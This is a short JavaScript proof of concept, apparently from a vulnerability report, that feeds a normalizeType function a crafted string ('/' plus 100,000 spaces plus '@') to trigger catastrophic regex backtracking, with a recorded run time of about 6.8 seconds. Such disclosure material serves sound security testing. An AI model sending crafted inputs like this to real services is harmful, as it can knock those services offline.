const { normalizeType } = require("./utils.js");

//Attack String :""+" "*100000+"@"
var str = "/";
for (var i = 0; i < 100000; i++) {
  str += " ";
}
str += "@";

var result = normalizeType(str);

// real    0m6.778s
// user    0m6.545s
// sys     0m0.020s
